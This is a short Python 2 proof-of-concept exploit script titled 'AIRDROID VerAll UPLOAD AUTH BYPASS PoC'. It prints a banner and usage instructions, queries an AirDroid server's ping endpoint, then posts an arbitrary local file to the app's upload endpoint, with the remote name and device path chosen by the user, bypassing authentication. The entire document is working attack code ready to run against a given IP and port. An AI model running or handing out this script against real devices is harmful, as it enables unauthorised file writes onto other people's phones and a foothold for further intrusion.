#/IN THE NAME OF GOD
#/auth====PARSA ADIB

import sys,requests,re,urllib2
def logo():
 print"\t\t       .__           .___             .__    .___"
 print"\t\t_____  |__|______  __| _/______  ____ |__| __| _/"
 print"\t\t\__  \ |  \_  __ \/ __ |\_  __ \/  _ \|  |/ __ | "
 print"\t\t / __ \|  ||  | \/ /_/ | |  | \(  <_> )  / /_/ | "
 print"\t\t(____  /__||__|  \____ | |__|   \____/|__\____ | "
 print"\t\t     \/               \/                      \/ "
 print "\t\tAIRDROID VerAll UPLOAD AUTH BYPASS PoC @ Parsa Adib"
if len(sys.argv)<6 or len(sys.argv)>6 :
 logo()
 print "\t\tUSAGE:python exploit.py ip port remote-file-name local-file-name remote-file-path"
 print "\t\tEXAMPLE:python exploit.py 192.168.1.2 8888 poc poc.txt /sdcard"
else :
 logo()
 print "\n[+]Reciving Details\n-----------------------------"
 try :
  p = requests.get('http://'+sys.argv[1]+':'+sys.argv[2]+'/sdctl/comm/ping/')
 except IOError :
  print "\n[!] Check If server is Running"
  sys.exit()
 for i in p.content.split(',') :
  for char in '{"}_':
   i = i.replace(char,'').upper()
  print "[*]"+i+""
 print "\n[+]Sending File\n-----------------------------"
 try :
  r = requests.post('http://'+sys.argv[1]+':'+sys.argv[2]+'/sdctl/comm/upload/dir?fn='+sys.argv[3]+'&d='+sys.argv[5]+'&after=1&fname='+sys.argv[3], files={sys.argv[4]: open(sys.argv[4], 'rb').read()})
  if (r.status_code == 200) :
   print "[*]RESPONSE:200"
   print "[*]FILE SENT SUCCESSFULY"
 except IOError :
  print "\n[!] Error"